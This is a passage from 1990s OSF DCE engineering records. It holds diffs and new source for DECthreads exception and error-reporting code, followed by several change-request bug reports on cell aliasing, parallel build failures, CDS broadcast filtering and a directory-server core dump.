> 	stuff = &buffer[0] + cma__strlen ((char *)buffer);
> 	cma__error_inq_text (exc_s_exception, stuff, &status);
> 
> 	len = cma__strlen ((char *)buffer);
> 	buffer[len] = '\n';
> 	buffer[len+1] = (char)0;
> 	cma__int_fprintf (
> 		stderr,
> 		(char *)buffer,
> 		exc->address.address,
> 		0);
> 
> 	}
> 
971,972c1053,1101
< }
<         
---
> #endif
> 
> #if _EXC_OS_ == _EXC__VMS
> /*
>  *  FUNCTIONAL DESCRIPTION:
>  *
>  *	This function is used on VMS systems to copy a condition signal
>  *	vector (or message vector) from one place to another. It copies
>  *	arguments that may be stack addresses as 0, and pre-pends the
>  *	exc_s_exccop condition if it's not already there.
>  *
>  *  FORMAL PARAMETERS:
>  *
>  *	sigvec		Address of signal vector
>  *	ctxvec		Address of output vector
>  *	ctxlen		Size (in ints) of output vector
>  *
>  *  IMPLICIT INPUTS:
>  *
>  *	none
>  *
>  *  IMPLICIT OUTPUTS:
>  *
>  *	none
>  *
>  *  FUNCTION VALUE:
>  *
>  *	none
>  *
>  *  SIDE EFFECTS:
>  *
>  *	none
>  */
> static void
> exc___copy_args
> #ifdef _EXC_PROTO_
> 	(unsigned int	*sigarg,
> 	unsigned int	*ctxarg,
> 	exc_int_t	ctxlen)
> #else
> 	(sigarg, ctxarg, ctxlen)
> 	unsigned int	*sigarg;
> 	unsigned int	*ctxarg;
> 	exc_int_t	ctxlen;
> #endif
>     {
>     exc_int_t		count, facility, lost;
>     unsigned int	condition;
>     exc_int_t		in, out, size, lasthdw;
974,975d1102
<         
< 	    
976a1104,1293
>     if (sigarg[0] >= ctxlen)
> 	count = ctxlen - 1;
>     else
> 	count = sigarg[0] - 2;
> 
>     lost = 0;				/* So far, no data lost */
>     lasthdw = 0;			/* So far, no hardware exceptions */
>     size = ctxlen - 3;			/* Actual size minus count, pc, ps */
>     in = 1;
>     facility = sigarg[1] & STS$M_FAC_NO;	/* Get unshifted facility */
> 
>     /*
>      * If the signal vector already starts with a DECthreads facility
>      * message, copy it as is (this includes foreign messages that have
>      * already been prefixed by "exception copied" or "exception copied with
>      * lost data" codes). Otherwise, add the prefix.
>      */
>     if (facility == (exc_facility_c & STS$M_FAC_NO))
> 	out = 1;
>     else {
> 	out = 3;
> 	ctxarg[1] = exc_s_exccop;
> 	ctxarg[2] = 0;
> 	count += 2;			/* We added two fields */
> 	size -= 2;
> 	}
> 
>     ctxarg[0] = count;
> 
>     while (out <= count) {
> 	exc_int_t	argcnt, argzero;
> 
> 
> 	condition = sigarg[in];
> 	facility = FACID (condition);
> 	
> 	if (facility == 0) {
> 	    exc_int_t	i, msgid;
> 
> 
> 	    switch (condition) {
> 		case SS$_FLTOVF_F : {
> 		    condition = SS$_FLTOVF;
> 		    break;
> 		    }
> 		case SS$_FLTDIV_F : {
> 		    condition = SS$_FLTDIV;
> 		    break;
> 		    }
> 		case SS$_FLTUND_F : {
> 		    condition = SS$_FLTUND;
> 		    break;
> 		    }
> 		default : {
> 		    break;
> 		    }
> 
> 		}
> 
> 	    msgid = MSGID (condition);
> 	    argcnt = 0;
> 	    argzero = 0;
> 	    lasthdw = 0;
> 
> 	    for (i = 0; i < exc___c_hwexcs; i++) {
> 
> 		if (msgid == exc___g_sysargs[i].msgid) {
>     		    argcnt = exc___g_sysargs[i].argcnt;
> 		    lasthdw = 1;	/* It's a hardware exception! */
> 		    break;
> 		    }
> 
> 		}
> 		    
> 	    }
> 	else if (facility == 1) {
> 	    argcnt = 1;
> 	    argzero = 0;
> 	    lasthdw = 0;
> 	    }
> 	else if (facility == (exc_facility_c >> 16)) {
> 	    argcnt = sigarg[in+1] + 1;	/* Copy count and any args */
> 	    argzero = 0;		/* Assume our stuff is copyable! */
> 	    lasthdw = 0;
> 	    }
> 	else {
> 	    argcnt = 1;			/* Copy count */
> 	    argzero = sigarg[in+1];
> 	    lost = 1;			/* Set the "lost" flag */
> 	    lasthdw = 0;
> 	    }
> 
> 	/*
> 	 * If there's enough room, copy the condition into the output vector.
> 	 * If there's not enough room for the whole thing, don't copy any of
> 	 * it, since $putmsg might freak out.
> 	 */
> 	if (size >= argcnt + argzero + 1) {
> 	    size -= (argcnt + argzero + 1);
> 	    ctxarg[out++] = condition;	/* Copy it */
> 	    in++;
> 
> 	    /*
> 	     * If we need to copy arguments, do so
> 	     */
> 	    while (argcnt > 0) {
> 		ctxarg[out++] = sigarg[in++];
> 		argcnt--;
> 		}
> 
> 	    /*
> 	     * We need to zero any user condition arguments: that's a shame,
> 	     * but they might be stack addresses that would do something
> 	     * weird when we try to print the message later.
> 	     */
> 	    while (argzero > 0) {
> 		ctxarg[out++] = 0;
> 		in++;
> 		argzero--;
> 		}
> 
> 	    }
> 	else {
> 	    lost = 1;
> 	    break;
> 	    }
> 	
> 	}
> 
>     /*
>      * If the last condition was a hardware type, and we already copied the
>      * PC and PS to the two slots we reserved for them (which would take us
>      * beyond the expected count, since we'd dropped the PC/PSL), then add
>      * them to the count. Otherwise, copy two zeros, so something will be
>      * there just in case a user condition code does something odd.
>      */
>     if (lasthdw && out > (count + 1))
> 	ctxarg[0] += 2;			/* Admit to the extra stuff in count */
>     else {
> 	ctxarg[out++] = 0;
> 	ctxarg[out++] = 0;
> 	}
> 
>     /*
>      * If we lost any information, then change the primary condition code
>      * from exc_s_exccop to exc_s_exccoplos so the user will know.
>      */
>     if (lost && ctxarg[1] == exc_s_exccop)
> 	ctxarg[1] = exc_s_exccoplos;
> 
>     }
> #endif
> /*  DEC/CMS REPLACEMENT HISTORY, Element EXC_HANDLING.C */
> /*  *36   20-APR-1992 07:29:06 BUTENHOF "Remove exception interest" */
> /*  *35   17-APR-1992 11:12:16 BUTENHOF "Improve TRY/CATCH performance" */
> /*  *34   31-MAR-1992 15:12:18 BUTENHOF "Fix VMS exception interest" */
> /*  *33   31-MAR-1992 13:31:33 BUTENHOF "Implement exception 'interest' model" */
> /*  *32   10-FEB-1992 08:51:01 BUTENHOF "Drop depth modifications on VMS" */
> /*  *31    7-FEB-1992 10:31:09 BUTENHOF "Clean up VAX VMS resignal" */
> /*  *30    6-FEB-1992 10:24:50 CURTIN "Added individual ifndef's for Alpha hardware exc's" */
> /*  *29   22-JAN-1992 17:40:10 CURTIN "added a few casts" */
> /*  *28    9-JAN-1992 10:27:38 BUTENHOF "Move ""Exception:"" text from message catalog" */
> /*  *27   23-DEC-1991 14:06:04 CURTIN " remove include of starlet.h on vax" */
> /*  *26   20-DEC-1991 07:30:01 BUTENHOF "Alpha exception work" */
> /*  *25   18-DEC-1991 06:45:44 BUTENHOF "Remove exc_reraise function" */
> /*  *24   16-DEC-1991 12:55:26 BUTENHOF "Update previous exception changes" */
> /*  *23   13-DEC-1991 09:54:05 BUTENHOF "Clear message args on putmsg" */
> /*  *22   27-NOV-1991 11:03:46 BUTENHOF "Fix for DEC C" */
> /*  *21   26-NOV-1991 11:19:12 BUTENHOF "More Alpha changes" */
> /*  *20   25-NOV-1991 14:00:15 BUTENHOF "Make cma_message.h conditional" */
> /*  *19   22-NOV-1991 11:57:45 BUTENHOF "Integrate dce message formatting" */
> /*  *18   18-NOV-1991 10:24:29 BUTENHOF "Fix test for ""resignal""" */
> /*  *17    6-NOV-1991 09:06:55 BUTENHOF "Fix config macro use" */
> /*  *16   31-OCT-1991 12:40:27 BUTENHOF "Unwind to called frame if depth != 0" */
> /*  *15   24-SEP-1991 16:30:13 BUTENHOF "Merge CMA5 reverse IBM/HP/Apollo drops" */
> /*  *14   21-AUG-1991 16:46:33 CURTIN "Removed VMS include of stdio.h" */
> /*  *13    6-AUG-1991 17:03:47 CURTIN "fix nested TRYs" */
> /*  *12   31-JUL-1991 18:40:13 BUTENHOF "Improve VMS condition integration" */
> /*  *11   26-JUL-1991 15:56:57 CURTIN "Use internal routines instead of setjmp/longjmp" */
> /*  *10    2-JUL-1991 16:47:29 BUTENHOF "Make exc_report flush stdout" */
> /*  *9    13-JUN-1991 18:03:10 CURTIN "Converted to use Unix messages on Unix platforms" */
> /*  *8    10-JUN-1991 18:25:36 SCALES "Add sccs headers for Ultrix" */
> /*  *7     2-MAY-1991 14:00:08 BUTENHOF "Utilize _longjmp where appropriate" */
> /*  *6    15-APR-1991 15:54:40 CURTIN "clean up previous addition" */
> /*  *5     8-APR-1991 20:32:26 CURTIN "changed cma__abort to cma__process_abort" */
> /*  *4     1-APR-1991 18:10:08 BUTENHOF "QAR 93, exception text" */
> /*  *3    24-JAN-1991 00:35:30 BUTENHOF "Fix exception name references" */
> /*  *2    28-DEC-1990 00:04:49 BUTENHOF "Change exception names" */
> /*  *1    12-DEC-1990 21:56:12 BUTENHOF "Exception support" */
> /*  DEC/CMS REPLACEMENT HISTORY, Element EXC_HANDLING.C */
+++++++++++++++++++ cma.h ++++++++++++++++++++
14,19d13
<  * Revision 1.1.11.3  94/10/21  13:43:15  jd
<  * 	noop
<  * 
<  * Revision 1.1.11.2  1994/10/20  21:26:45  jd
<  * 	messages
<  *
23c17
<  * 
---
>  *
131d124
< 
148,150d140
< #include <dce/dce.h>
< #include <dce/dce_msg.h>
< #include <dce/dcethdmsg.h>
+++++++++++++++++++ cma_send_error.c ++++++++++++++++++++
+++++++++++++++++++ exc_handling.h ++++++++++++++++++++
14,19d13
<  * Revision 1.2.23.2  94/10/20  17:26:49  jd
<  * 	messages
<  * 
<  * Revision 1.2.22.2  94/09/06  17:10:33  jd
<  * 	servicability
<  * 
174,175d167
< 
< 
672d663
< #ifdef DONT_DEFINE
682a674,707
> #if _EXC_OS_ == _EXC__VMS
> /*
>  * A few of these codes are somewhat imaginary, since VMS doesn't support
>  * condition codes that very closely approximate the sense of some UNIX
>  * signals.  SIGTRAP, SIGIOT, and SIGEMT have no clear parallels, and the
>  * values chosen are fairly arbitrary.  For two others, we chose what seemed
>  * close equivalents: SIGPIPE becomes "no mailbox", and SIGXFSZ becomes "disk
>  * quota exceeded".
>  */
> # define exc_s_illaddr		12	/* ss$_accvio */
> # define exc_s_exquota		28	/* ss$_exquota */
> # define exc_s_insfmem		292	/* ss$_insfmem */
> # define exc_s_nopriv		36	/* ss$_nopriv */
> # define exc_s_normal		1	/* ss$_normal */
> # define exc_s_illinstr		1084	/* ss$_opcdec */
> # define exc_s_resaddr		1100	/* ss$_radrmod */
> # define exc_s_privinst		1084	/* ss$_opcdec */
> # define exc_s_resoper		1108	/* ss$_roprand */
> # define exc_s_SIGTRAP		1044	/* ss$_break */
> # define exc_s_SIGIOT		44	/* ss$_abort */
> # define exc_s_SIGEMT		1068	/* ss$_compat */
> # define exc_s_aritherr		1164	/* ss$_fltovf */
> # define exc_s_SIGSYS		20	/* ss$_badparam */
> # define exc_s_SIGPIPE		628	/* ss$_nombx */
> # define exc_s_excpu		8364	/* ss$_excputim */
> # define exc_s_exfilsiz		1004	/* ss$_exdiskquota */
> # define exc_s_intovf		1148	/* ss$_intovf */
> # define exc_s_intdiv		1156	/* ss$_intdiv */
> # define exc_s_fltovf		1164	/* ss$_fltovf */
> # define exc_s_fltdiv		1172	/* ss$_fltdiv */
> # define exc_s_fltund		1180	/* ss$_fltund */
> # define exc_s_decovf		1188	/* ss$_decovf */
> # define exc_s_subrng		1196	/* ss$_subrng */
> #else
725a751
> #endif
760d785
< #endif /* DONT_DEFINE */

New files

cma_send_error.c


/*
 * @OSF_COPYRIGHT@
 * 
 */
/*
 * HISTORY
 * $Log:	c012644,v $
# Revision 1.3  96/06/25  10:27:59  root
# changed fields: Status  
# 
# Revision 1.2  94/10/27  15:15:15  root
# changed fields: Short Description  Priority  Status  Fix By Baseline   new/changed/deleted note(s) [jd 10/27/94 public]
# 
 * Revision 1.1.2.2  94/10/20  17:26:33  jd
 * 	messages
 * 
 * Revision 1.1.1.3  94/09/08  9:01:56  jd
 * 	Removed include of dcethdmac.h and dcethdsvc.h
 * 
 * Revision 1.1.1.2  1994/09/07  21:14:10  jd
 * 	servicability
 *
 * Revision 1.1.1.2  94/09/06  17:09:57  jd
 * 	servicability
 * 
 * $EndLog$
 */


#include <dce/cma.h>
#include <dce/rpc.h>
#include <dce/dce_error.h>
#include <dce/dcethdmsg.h>
#include <stdio.h>
#include <cma_signal.h>
#include <cma_send_error.h>

#define ERROR_STRING_EXTRA 256 /* Room for line number, filename etc... */
unsigned char cma_dce_fatal_string[dce_c_error_string_len+ERROR_STRING_EXTRA];
unsigned char cma_dce_error_string[dce_c_error_string_len+ERROR_STRING_EXTRA];
unsigned char cma_dce_empty_string[dce_c_error_string_len+ERROR_STRING_EXTRA];
unsigned char cma_dce_error_buffer[dce_c_error_string_len+ERROR_STRING_EXTRA];

char cma_error_output_buffer[dce_c_error_string_len + ERROR_STRING_EXTRA];

void
cma__init_dce_errors(void)
{
  int st;
  int emptylen;

  dce_cma_error_inq_text(
            thd_empty_error_string,cma_dce_empty_string,&st);
  emptylen = strlen((char *)cma_dce_empty_string);
  dce_cma_error_inq_text(
            thd_fatal_error_string,cma_dce_fatal_string,&st);
  cma_dce_fatal_string
        [strlen((char *)cma_dce_fatal_string) - emptylen] = '\0';
  sprintf((char *)cma_dce_fatal_string,"%s %d",cma_dce_fatal_string,getpid());
  dce_cma_error_inq_text(
            thd_error_string,cma_dce_error_string,&st);
  cma_dce_error_string
        [strlen((char *)cma_dce_error_string) - emptylen] = '\0';
  sprintf((char *)cma_dce_error_string,"%s %d",cma_dce_error_string,getpid());
}

void
cma_send_fatal(unsigned long status)
{
  int st;
 
  printf("%s\n",cma_dce_fatal_string); 
  dce_cma_error_inq_text(status,cma_dce_error_buffer,&st);
  if(st == 0)
    {
      printf("%s\n",cma_dce_error_buffer);
    }
  else
    {
      printf("Unknown status %d\n",status);
    }
  fflush(stdout);
  cma__abort_process (SIGIOT);        /* Abort with core dump */
}

void
cma_send_error(unsigned long status)
{
  int st;

  printf("%s\n",cma_dce_error_string); 
  dce_cma_error_inq_text(status,cma_dce_error_buffer,&st);
  if(st == 0)
    {
      printf("%s\n",cma_dce_error_buffer);
    }
  else
    {
      printf("Unknown status %d",status);
    }
  fflush(stdout);
}

void
cma_send_exception(unsigned long address)
{
  int st;

  printf("%s\n",cma_dce_fatal_string);
  dce_cma_error_inq_text(exc_s_exception,cma_dce_error_buffer,&st);
  if(st == 0)
    {
      printf("%s\n",cma_dce_error_buffer);
    }
  else
    {
      printf("An address exception has occurred\n");
    }

  fflush(stdout);
}

void
cma_send_errno(unsigned long errno)
{
  int st;
  dce_cma_error_inq_text(thd_s_errno_raised,cma_dce_error_buffer,&st);
  sprintf(cma_error_output_buffer,"%s %d\n", cma_dce_error_buffer,errno);
  printf("%s\n",cma_error_output_buffer);
  fflush(stdout);
}


cma_send_error.h


/*
 * @OSF_COPYRIGHT@
 * 
 */
/*
 * HISTORY
 * $Log:	c012644,v $
# Revision 1.3  96/06/25  10:27:59  root
# changed fields: Status  
# 
# Revision 1.2  94/10/27  15:15:15  root
# changed fields: Short Description  Priority  Status  Fix By Baseline   new/changed/deleted note(s) [jd 10/27/94 public]
# 
 * Revision 1.1.2.2  94/10/20  17:26:37  jd
 * 	messages
 * 
 * Revision 1.1.1.2  94/09/06  17:10:05  jd
 * 	servicability
 * 
 * 
 * $EndLog$
 */

extern void cma__init_dce_errors(void);
extern void cma_send_fatal(unsigned long);
extern void cma_send_error(unsigned long);
extern void cma_send_errno(unsigned long);
extern void cma_send_exception(unsigned long);



CR Number                     : 12622
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 12583, 12901
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : "cdsalias connect" fails in cell configured with a 2-level cellname
Reported Date                 : 10/13/94
Found in Baseline             : 1.1b21
Found Date                    : 10/13/94
Severity                      : A
Priority                      : 0
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/13/94 public]

(Found in baseline bl-21.1, erroneously initially labelled 20.4)

In trying to setup a hierarchical relationship between a parent
and child cell, I took the simplified approach of creating a cell 
which was configured with the desired name of the child (a cellname
containing 2 simple names) to begin with (eg /.../foo/bar). 

After setting up intercell access via gdad and DNS, and setting
proper permissions on the root directories in both cells, I executed

  dcecp> cdsalias connect

which returned the error

  "Error: There is no existing primary alias for the local cell."

Apparently either "cdsalias connect" has to handle this case or 
the CDS_CellAliases attribute has to be established during initial
cell configuration.

[10/14/94 public]
12583 contained information on 2 problems. A core dump and a cds alias
problem. 12583 will continue to reference the core dump problem. We opened
this one to refer to the alias problem. 12583 assigne to me, I believe its 
an alignment problem in deb_ascii_ObjUUID. This one goes to Roger.

[10/14/94 public]
Why are you using "cdsalias connect" as opposed to "cellalias connect" ?
With the recent design change to cdsalias (as used by cellalias), the
ordered steps are "cdsalias create xxx", "cdsalias set xxx", "cdsalias
connect".  The alias must exist before you can set it as the primary
alias, and the connect takes no argument and uses the existing primary
alias for the connect.

Now, if you wish to add the feature that on initial cell configuration
that the CDS_CellAliases attribute be preset with the cellname, then
it should be done by the initial cell configuration.  "cdsalias connect"
cannot because of the above change.  Let me point out the caveat that
the CDS_DirectoryVersion must be 4.0 for any cdsalias commands.  By
default, currently the directory version will be 3.0.  For initial cell
configuration, it's probably a good idea to start with 4.0.  Janet McCann
added a cdsd startup option (-v #.#) that will change the default directory
version setting.  For initial cell configuration, I suggest starting
up cdsd via "cdsd -a -v 4.0" so that the CDS_DirectoryVersion of the root
will already be set to 4.0.  The CDS server should startup this way
all of the time for new cells.  Then config should do the "cdsalias
create xxx" and "cdsalias set xxx" commands.  The "cdsalias connect"
will fail because intercell trust isn't setup yet.

[10/14/94 public]
Roger, let me try to answer some of your questions.  Note that several
currently open defects are related and that they all stem from trying two
approaches to setting up hcells, both of which I think are valid:

 1. configure two cells: /.../a and /.../c.
    then from cell /.../c
      cellalias create /.../a/b
      cellalias set /.../a/b
      registry connect /.../a
      cdsalias connect
    
 2. configure two cells: /.../a and /.../a/b
    then from cell /.../a/b
      registry connect /.../a
      cdsalias connect

Case 2 is when you are configuring a new cell with the expressed purpose of
it being a child of an existing parent.

Note that there is no "cellalias connect" command since all it would do is
"cdsalias connect".

The point that "the alias must exist before you can set it as the primary
alias" is well taken but I have a question.  You use the phrase "primary
alias", I usually use the phrase "primary cellname".  The difference seems
to be at issue.  Right after dce_config you have a cellname but no aliases.
I bet the "new" cdsalias connect command just looks for the CDS_CellAliases
attribute on the /.: directory and after dce_config it's not there.  To me
there are two solutions:

 * have the attribute created during initialization.  The point of needing
   version 4.0 directories is well taken.  Naive question:  could a cdsd
   started with -v 4.0 include the attribute in the /.: directory?
 * have cdsalias connect look first for the attribute and if not found then
   look at dce_cf_get_cellname().  If necessary then it could create the
   attribute.  

Your last suggestion of:

> Then config should do the "cdsalias create xxx" and "cdsalias set xxx"
> commands.  The "cdsalias connect" will fail because intercell trust isn't
> setup yet.

was as I understand the first work-around that was tried when we saw the
"cdsalias connect" failure in case two.  (Oh, it's looking for the
CDS_CellAlias attribute, well cellalias create creates it I'll call it).
So given my example in case 2 above, I believe that people tried to
configure a cell called /.../a/b and then ran:
  cdsalias create /.../a/b
The result was the error reported in CR 12594 that you apparently can't do a
cdsalias create with a hierarchical name.  This also affects our testing of
Case 1 since the initial "cellalias create" command fails on the cdsalias
create call.  (Also note that that CR has lots of info about a hostdata
command failing that resulted from a workon.  Kevin is verifying and will
be opening a separate dced CR for that info.

Now we had originally considered CR 12594 of lesser importance since
creating an alias for the existing cellname seemed a bit out of the normal.
But I think it comes down either this CR or that CR needs to be addressed.
Rethinking now though, since it affects Case 1 above, it's pretty serious
as well.

[10/17/94 public]
We're past the doc review deadline and aren't done yet. The unintegrated 
tree *deadline* is about 7 workdays away. I think its time to say option
2 above isn't supported this release. We need to concentrate on finding out
exactly what does work and documenting it. I believe we should document 
number 2 as a no-no and go on. Howard????

[10/19/94 public]
Agreed.  The work around for Case 2 is to use Case 1.  That is even if you
are creating a new cell, give it a simple name, then follow case 1.  Case 2
was a useful work-around for 1.1 development, but it's usefulness has
passed. 

Lisa needs to doc this.

I'll defer this for 1.2 to fix.

[6/2/95 public]

CR 12901 was created to separately track proposed modifications to
dce_config to allow initial cell setup with a default 4.0 directory
version.



CR Number                     : 12610
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : bld
Subcomponent Name             : 
Short Description             : Promblem with doing two builds simultaneously on same machine
Reported Date                 : 10/13/94
Found in Baseline             : 1.1
Found Date                    : 10/13/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/13/94 public]

Platform - HPUX 
Machine - Zagreb

Nightly build failed on HPUX; passed on AT486; On RIOS build is clean, 
tests are compiling

extract from build log 'build.log.10-12-94' in the directory /u1/RAT_tools/logs/HPUX on 'vertigo'

relative path: ./file/sys
mkdir ../../../obj/hp800/file/sys
cd ../../../obj/hp800/file/sys
c89 -c    -D_SHARED_LIBRARIES  +z  -DAFS_DEBUG -DDCESHARED_PATH=\"/opt/dce\" -DDCELOCAL_PATH=\"/opt/dcelocal\" -D__hppa -Dhp9000s800 -Dhp9000s700 -D__hp9000s800 -D__hp9000s700 -DHPUX -D__hpux -Dunix +DA1.0 -D_HPUX_SOURCE    -I- -I. -I/u3/devobj/sb/nb_ux/src/file/sys -I/project/dce/build/dce1.1-snap/src/file/sys  -I/u3/devobj/sb/nb_ux/export/hp800/usr/include -I/project/dce/build/dce1.1-snap/export/hp800/usr/include    /project/dce/build/dce1.1-snap/src/file/sys/lclcalls.c
if [ -f /u3/devobj/sb/nb_ux/src/file/sys/build.made ]; then  rm -rf `head -1 /u3/devobj/sb/nb_ux/src/file/sys/build.made | awk -F":" '{print $1}'`;  fi
if [ ! -d /u3/devobj/sb/nb_ux/src/file/ncscompat ]; then  makepath /u3/devobj/sb/nb_ux/src/file/ncscompat/ > /usr/tmp/build.made 2>& 1;  mv /usr/tmp/build.made /u3/devobj/sb/nb_ux/src/file/ncscompat;  fi;
mv: /usr/tmp/build.made: cannot access: No such file or directory
*** Error code 1

...
...


if [ -f /u3/devobj/sb/nb_ux/src/dce/utils/db44/build.made ]; then  rm -rf `head -1 /u3/devobj/sb/nb_ux/src/dce/utils/db44/build.made | awk -F":" '{print $1}'`;  fi
make: don't know how to make ../file/ncscompat/compat_junct.o (continuing)
`build_all' not remade because of errors.
*** Error code 1


...
...

ld -b -L/u3/devobj/sb/nb_ux/export/hp800/usr/shlib -L/project/dce/build/dce1.1-snap/export/hp800/usr/shlib -L/usr/shlib -L/u3/devobj/sb/nb_ux/export/hp800/usr/lib     -L/project/dce/build/dce1.1-snap/export/hp800/usr/lib   -o libdsal.sl.X d26phon.o  -ldce  
ld: Can't find library for -ldce
*** Error code 1

[10/13/94 public]
It looks like a build problem.  I am reassigning it to bldc].

[10/14/94 public]
This is a problem only when there are two builds running simultaneously
on the same machine.  What happens is that there are some temporary files
created in the /tmp directory called "build.made".  The problem is that
after the first build is done with the file it moves it, and the second
build looks for it and can't find it - so the build gets an error.  The 
correct thing to do would be to name the build.made file something unique,
like with a process id or something like that.  Anyway we are deferring it
because there is a work around => don't do two builds as the same time.

[2/6/96 public]
Work-around: Don't do two builds on the same machine at the same time. Changed
this to Enh Req.



CR Number                     : 12599
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : server
Short Description             : wait_until_consistent poor error behavior
Reported Date                 : 10/12/94
Found in Baseline             : 1.1b20
Found Date                    : 10/12/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : rs/rs_master_replist.c
Sensitivity                   : public

[10/12/94 public]
When rs_m_replist_check_prop_seqno() is called in a replica it returns
sec_rgy_read_only status as expected, but with a boolean "true" return
value & it causes a serviceability error record to be written.
Simple fixes for unintegrated as time allows.



CR Number                     : 12592
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : cdsclerk
Short Description             : filtering broadcasts by cell name instead of uuid
Reported Date                 : 10/12/94
Found in Baseline             : 1.1b21
Found Date                    : 10/12/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/12/94 public]

The smoketests accidentally uncovered a problem with cdsadv broadcasts
and filtering by cell name rather than by cell uuid. A broadcast of
clearinghouse names and locations will be cached if the cell name
matches, even if the cell uuid does not!

Multiple cells with the same name are not allowed BUT the problem
should be handled gracefully and NOT by having to deduct from the
cryptic cds error messages caused by the "corrupt" cache.

Please filter by cell uuid, and if this is the right place to catch
a duplicate cell name, please handle this case as well - Thanks.



CR Number                     : 12587
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : Need nca_s_auth_bad_integrity
Reported Date                 : 10/12/94
Found in Baseline             : 1.1
Found Date                    : 10/12/94
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/12/94 public]

The new reject status code, nca_s_auth_bad_integrity, needs to be defined
(in AES and/or X/Open spec.) so that the server can report the more useful
reject reason.



CR Number                     : 12580
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : gds
Subcomponent Name             : dsa
Short Description             : add_entry37v causes DSA to
dump core
Reported Date                 : 10/11/94
Found in Baseline             : 1.1
Found Date                    : 10/11/94
Severity                      : C
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/11/94 public]

Bits: nightly build of 10/05:

While running the XDS FVT on the HP, the single-threaded valid testcase 

	add_entry37v

caused the DSA to dump core.

This was reproduced in Munich as well

Here's the stack trace:

xdb -s -l ALL /opt/dcelocal/bin/gdsdsa core

>t
 0 free@libc + 0x00000008 (hp-ux export stub)
 1 asn1_alloc_free@libdce + 0x000001d8 (0x400b86d0, 0x7aff0400, 0x30, 0x7b034a78)
 2 dua_Tstring_free + 0x00000034 (0x7aff0400, 0, 0x30, 0x7b034a78)
 3 pthread_mutex_unlock@libdce + 0x00000038 (0x4002fe70, 0x3, 0x7b0352f8, 0x7b034a78)
 4 cma_lib_free@libdce + 0x00000148 (0x400b8558, 0x1, 0x7b035080, 0)
 5 asn1_alloc_free@libdce + 0x0000011c (0x400b8558, 0x1, 0x3231385f, 0x6432615f)
 6 duaCertListUnsigned_free + 0x00000088 (0x7b035150, 0x7b035080, 0x7b035150, 0x40136010)
 7 duaCertList_free + 0x00000030 (0x7b035150, 0x6432615f, 0x76616c75, 0x6174745f)
 8 dua_att_value1_free + 0x00000758 (0x7b03514c, 0x7b035080, 0x7b035080, 0x7b034cc8)
 9 d2a106_ids_atval_to_atval + 0x0000132c (0x400b8510, 0x3f1, 0x401365f0, 0x401365f2)
10 d2a060_mk_att_apdu + 0x0000031c (0x400b8328, 0x7b034f10, 0x7b034cc4, 0x7b034cc8)
11 d2a076_ids_add_arg_apdu + 0x000002cc (0x7b034d80, 0x7b034cc4, 0x7b034cc8, 0x7b034e5c)
12 d2a074_asn_add_arg_apdu + 0x00000164 (0x7b034d80, 0x7b034cc4, 0x7b034cc8, 0x7b034cb8)
13 d2a001_asn1_apdu + 0x000014d4 (0x40000006, 0x2, 0x7b034cc4, 0x7b034cc8)
14 d26_m07_work (atsvpb = 0x40001ba8, argc = 5, argv = 0x7b034c4c)    [../../../../../src/directory/gds/dsa/d26dsa.c: 874]
15 main (argc = 13, argv = 0x7b034a90)    [../../../../../src/directory/gds/dsa/d26dsa.c: 1701]

[10/12/94 public]
I tested it several times: I doesn't happen any more.
I checked the addresses which are freed - they have really been allocated
before. 
I have no idea why this dumps core some times.
I need a malloc debug library (for cma_lib_malloc, ...).

[10/12/94 public]
I couldn't reproduce it today.  I'm dropping the priority and marking this
'defer.'



CR Number                     : 12538
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : cdsadv not going away properly
Reported Date                 : 10/6/94
Found in Baseline             : 1.1
Found Date                    : 10/6/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/6/94 public]

We have noticed that dce_shutdown doesn;t alway dispatch the advertizer 
lately. We though it may be a dce_shutdown timing problem but this 
morning I wanted to shutdown a cell that had been running pretty much 
idl since late yesterday decided to look at this problem. I did

cdscp disable clerk 

and all of the clerks went away but cdsadv did not. It got a few ticks of 
cpu time over a couple of minutes elapsed time but remained up. After
